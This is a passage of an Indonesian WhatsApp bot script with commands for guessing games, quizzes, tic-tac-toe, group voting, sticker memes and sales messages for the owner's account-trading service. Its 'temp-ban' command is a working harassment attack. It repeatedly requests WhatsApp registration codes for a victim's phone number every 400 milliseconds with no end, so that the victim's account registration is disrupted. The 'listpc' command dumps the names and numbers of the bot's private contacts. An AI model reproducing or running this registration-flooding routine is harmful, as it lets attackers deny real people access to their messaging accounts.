 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'gambar') {
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 kyy.sendImage(from, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
 tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak gambar`}, {quoted:m}) 
 delete tebakgambar[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kata') {
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 kyy.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kata` }, {quoted:m}) 
 delete tebakkata[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'kalimat') {
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 kyy.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lirik') {
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 kyy.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
 tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(3000)
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption: `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lirik`} , {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
 }
 } else if (args[0] === 'lontong') {
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 kyy.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(3000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 kyy.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/361f59190a8536564b0b4.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
 }
}
break
//=================================================//
case 'kuismath': case 'math': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
 let { genMath, modes } = require('./src/math')
 if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
 let result = await genMath(text.toLowerCase())
 kyy.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
}
break
//=================================================//
case 'ttc': case 'ttt': case 'tictactoe': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
 let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = from
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
X: '❌',
O: '⭕',
1: '1️⃣',
2: '2️⃣',
3: '3️⃣',
4: '4️⃣',
5: '5️⃣',
6: '6️⃣',
7: '7️⃣',
8: '8️⃣',
9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await kyy.sendText(room.x, str, m, { mentions: parseMention(str) } )
await kyy.sendText(room.o, str, m, { mentions: parseMention(str) } )
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: from,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
//=================================================//
case 'delttc': case 'delttt': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
 let roomnya = Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))
if (!roomnya) throw `Kamu sedang tidak berada di room tictactoe !`
delete this.game[roomnya.id]
m.reply(`Berhasil delete session room tictactoe !`)
}
break
//=================================================//
case 'suitpvp': case 'suit': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, from, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await kyy.sendText(from, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) kyy.sendText(from, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
//=================================================
case 'testi1': {
teks28 = `*TESTI 1*

INI TESTIMONI KYY YANG KE1
KAK ${pushname}

JANGAN RAGU ORDER DI KYYXD`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/5c2a375ab0e309fe0cb21.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi2': {
teks28 = `*TESTI 2*

INI TESTIMONI KYY YANG KE2
KAK ${pushname}

JANGAN RAGU ORDER DI KYYXD`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/515915f661c22632e1065.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi3': {
teks28 = `*TESTI 3*

INI TESTIMONI KYY YANG KE3
KAK ${pushname}

JANGAN RAGU ORDER DI KYYXD`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/ce7f7bf6bf72a2c9049f9.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi4': {
teks28 = `*TESTI 4*

INI TESTIMONI KYY YANG KE4
KAK ${pushname}

JANGAN RAGU ORDER DI KYYXD`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/5c2a375ab0e309fe0cb21.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'testi5': {
teks28 = `*TESTI 5*

INI TESTIMONI KYY YANG KE5
KAK ${pushname}

JANGAN RAGU ORDER DI KYYXD`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/9d3a1716adf6e71b2cc0b.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case "setppbot": {
if (!isCreator) return m.reply(mess.owner)
if (!quoted) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/Reply Image Dengan Caption ${prefix + command}`)
var medis = await kyy.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await kyy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
m.reply(`Sukses`)
} else {
var memeg = await kyy.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
m.reply(`Sukses`)
}
}
        break
//=================================
        case 'smeme': case 'stickermeme': case 'stickmeme': {
 let respond = `Kirim/reply image/sticker dengan caption ${prefix + command} text1|text2`
 if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
  if (!/image/.test(mime)) throw respond
  if (!text) throw respond
  reply(`Proses Tuan...`)
  let atas = text.split('|')[0] ? text.split('|')[0] : '-'
  let bawah = text.split('|')[1] ? text.split('|')[1] : '-'
  let { TelegraPh } = require('./lib/uploader')
  try {
  let mee = await kyy.downloadAndSaveMediaMessage(quoted)
  let mem = await TelegraPh(mee)
  let smeme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem}`
  let awikwok = await kyy.sendImageAsSticker(m.chat, smeme, m, { packname: global.packname, author: global.author })
  await fs.unlinkSync(awikwok)
  } catch (e) {
  reply(`Sedang Maintenance Tuan`)
  }
  }
  break 
      case 'apakah': 

if (!text) return reply('Maaf, command ini hanya untuk pemilik.')
 if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya ganteng`)
const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
const kah = apa[Math.floor(Math.random() * apa.length)]
kyy.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted:m })
        break
case "done": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
if (!text.split(",")) return m.reply("barang,harga\n\n*Contoh :* Panel Unlimited,2")
const [barang, harga] = text.split(",")
if (isNaN(harga)) return m.reply("Format Harga Tidak Valid")
var total = `${harga}000000`
var total2 = Number(`${harga}000`)
const teks = `*TRANSAKSI DONE BY ${ownername} ✅*

*📦 Barang :* ${barang}
*💸 Nominal :* Rp${toRupiah(total2)}
*⏰ Waktu :* ${time}

_*Terimakasih Sudah Mempercayai & Menggunakan Jasa KyyXD 🥳*_`
 kyy.relayMessage(m.chat,  {requestPaymentMessage: {currencyCodeIso4217: 'IDR', amount1000: Number(total), requestFrom: m.sender, noteMessage: { extendedTextMessage: { text: `${teks}`, contextInfo: { externalAdReply: { showAdAttribution: true}}}}}}, {})
}
break
if (!isCreator) return mess.owner
case "tunda": {
const text12 = `
*━───━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 ]━───━*

Hᴀʟᴏ Kᴀᴋ ${pushname}
Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Mᴀꜱɪʜ Dɪᴘᴇɴᴅɪɴɢ Nɪʜ 😓,
Tᴜɴɢɢᴜ Kᴏɴꜰɪʀᴍᴀꜱɪ Sᴇʟᴀɴᴊᴜᴛɴʏᴀ Yᴀ 😇

━───━━───━━───━━───━━───━`
reply(text12)
}
break
    case "proses": {

const text12 = `
*━─━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗣𝗿𝗼𝘀𝗲𝘀 ]━─━*

Hᴀʟᴏ Kᴀᴋ ${pushname}
Sᴇᴋᴀʀᴀɴɢ Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Sᴇᴅᴀɴɢ 
Dɪ Pʀᴏꜱᴇꜱ Mᴏʜᴏɴ Tᴜɴɢɢᴜ 
Sᴇʙᴇɴᴛᴀʀ Yᴀ 😅

─━─━─━─━─━─━─━─━─━─━─`
reply(text12)
}
break
if (!isCreator) return mess.owner
case "batal": {
const text12 = `
*━─━[ 𝗧𝗿𝗮𝗻𝘀𝗮𝗸𝘀𝗶 𝗕𝗮𝘁𝗮𝗹 ]━─━*

Hᴀʟᴏ Kᴀᴋ ${pushname}

📆 𝗧𝗮𝗻𝗴𝗴𝗮𝗹: ${date}
🕰️ 𝗪𝗮𝗸𝘁𝘂: ${xtime}
✨ 𝗦𝘁𝗮𝘁𝘂𝘀: Batal

Yᴀʜ Tʀᴀɴꜱᴀᴋꜱɪ Kᴀᴍᴜ Dɪ Bᴀᴛᴀʟᴋᴀɴ 😭
Sᴇᴍᴏɢᴀ Lᴀɪɴ Kᴀʟɪ Bᴇʀʜᴀꜱɪʟ 😊

─━─━─━─━─━─━─━─━─━─`
reply(text12)
}
break    
case 'ttsearch': {
      if (!text) throw `🚩Example: ${prefix+command} Pencarian`
      if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
                     let res = await fetch(`https://api.junn4.my.id/search/tiktoksearch?query=${text}`)
    let spas = "              "
    let data = await res.json()
    let json = data.result
	let cap = `${spas}*「 T I K T O K S E A R C H 」*

*📛Author:* ${json.title}

${global.footer2}`
kyy.sendMessage(m.chat, { video: { url: json.no_watermark }, caption: cap }, { quoted: m})
const kyytikmp3 = {url:data.audio}
kyy.sendMessage(m.chat, { audio: kyytikmp3, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
} 
                break
case 'temp-ban': {
if (!isCreator) return reply(`Khusus Kyy`)
if (!text) return m?.reply(`example ${command} 62|87872627288`)
if (!/|/.test(text)) return m?.reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|87872627288`)
let numbers = JSON.parse(fs.readFileSync('./database/tb.json'))

let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number

await m?.reply(`👤 Sukses! Gangguan Registrasi telah berhasil dikirim ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down 🩸.`)

let { state, saveCreds } = await useMultiFileAuthState('tb')

let spam = makeWaSocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})

let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}

numbers[fullNo] = { cCode, number };
fs.writeFileSync('./database/tb.json', JSON.stringify(numbers, null, '\t'));
setInterval(() => {
dropNumber()
}, 400)
}
break       
case 'listpc': {
if (!isCreator) return m.reply('Lu Siapa Kocak?')
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `*PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `*Name :* ${nama}\n*User :* @${i.split('@')[0]}\n*Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 kyy.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listgc': {
             if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await kyy.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
kyy.sendTextWithMentions(m.chat, teks, m)
}
break
case 'rules': {
reply(` _Rules Hanako AI_

- No Call Bot
- No Spam Bot
- No Culik Bot
- No Spam Owner
- No Spam Bug Bot

Itulah Rules Hanako AI Kak Jangan Langgar Ya Kak`)
             await kyy.sendMessage(m.chat, {audio: fs.readFileSync('./Vn/rulesy.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
             break
             case 'formatneed': {
             reply(`*FORMAT NEED AKUN BY KYYXD*
_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU KYY TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN KYYXD AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`)
}
break
case 'formatjp': {
reply(`*FORMAT JASA PSOT AKUN BY KYYXD*

_NOTE!!! : INI BUKAN 100% AKUN MILIK ADMIN ATAU KYY TETAPI AKUN MILIK SELER!!!_

LOG :
MC :
OP : 
SPEK :

_JANGAN LUPA SLALU MENGGUNAKAN JASA ADMIN KYYXD AGAR TERHINDAR DARI PENIPUAN ATAU MODUS LAINNY_`    )
}
break
case 'feerekber': {
reply(`ALL FEE REKBER DI KYY HANYA 5K`)
}
break
case 'feegc': {
reply(`langsung culik 6288286326619 / Kyy`)
}
break
case 'donasi': {
reply(`Ketik .pembayaran Saja Kak Terimakasih Telah Bedonasi Dan Mendukung Perkembangan Hanako Eemoga Rezeki Ny lancar aamiin`)
}
break
case "gempa": {
if (!isPrem && global.db.data.users[sender].limit < 3) return reply('Maaf Kak Limit Anda Habis')
             db.data.users[sender].limit -= 3 // -1 limit
                reply('Limit Anda Terpakai 3')
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*── 「 GEMPA NEWS 」 ──*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await kyy.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
setReply(mess.error.api)
}
}
break   
case 'afk': {
if (isBan) return m.reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${pushname}... Telah Afk Dengan Alasan ${text ? ': ' + text : ''}`)
}
break
         case 'vote': {
            if (!m.isGroup) return reply(`khusus group`)
            if (!text) return reply(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return reply(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            reply(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            kyy.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return reply(`Khusys group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            kyy.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return reply(`khusus group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return reply('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            kyy.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return replt(`khusus group`)
if (!text) return reply(`_*no voting in this group!*_\n\n.vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


© KyyXD
`
kyy.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return reply(`khusus group`)
            if (!text) return reply(`_*no voting in this group!*_\n\n*.vote* - to start voting`)
            delete vote[m.chat]
            reply('Successfully Deleted Vote Session In This Group')
	    }
            break
                        case 'setsubject':
                if (!isCreator) return reply('*khusus Kyy Aj Su*')
if (!m.isGroup) return m.reply('ᴋʜᴜsᴜs ɢʀᴏᴜᴘ')
if (!isBotAdmins) return m.reply('ʙᴏᴛ ʙᴇʟᴜᴍ ᴀᴅᴍɪɴ')
if (!isAdmins) return m.reply('ᴋʜᴜsᴜs ᴀᴅᴍɪɴ ɢʀᴏup')
                if (!text) return reply('Text ?')
                await kyy.groupUpdateSubject(m.chat, text)
                reply(mess.done)
                break
                case 'invite': {
	if (!m.isGroup) return reply(`khusus group`)
	if (!isBotAdmins) return reply(`hanako belum admin`)
if (!text) return reply(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 6288286326619`)
if (!text) return reply(`Enter the number together without *+*`)
if (!text) return reply(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await kyy.groupInviteCode(group)
      await kyy.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        reply(` An invite link is sent to the user`) 
}
break
 case 'simisimi': case 'simi':
if (!text) reply('What do u want to ask?')
let simi = await fetchJson(`https://aemt.me/simi?text=${text}`)
const simi2 = simi.result
kyy.sendMessage(m.chat, {text: simi2}, {quoted: m})
break
case 'antibot':
if (!m.isGroup) return reply(`khsusu group`)
if (!isAdmins) return reply(`Khsusus admin`)
if (args[0] == 'on'){
if (global.antibot) return reply('UDAH ON!')
global.antibot = true
reply('Fitur antibot telah di aktifkan')
} else if (args[0] == 'off'){
if (!global.antibot) return reply('UDAH OFF!')
global.antibot = false
reply('Fitur antibot telah di matikan')
} else reply('on / off')
break //Powered By conn & Darwin
case 'd': case 'del': case 'delete': case 'hapus':
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
kyy.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
break //Powered By conn & Darwin
case 'leavegc': {
if (!isCreator) return reply('Khusus Kyy')
if (!m.isGroup) return reply('Khusus Group')
await kyy.groupLeave(m.chat).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
}
break
case 'auto-ai': case 'autoai':
if (!isCreator) return (`khusus kyy`)
if (args[0] == 'on'){
global.autoTyping = true
reply('Nobara auto ai telah aktif')
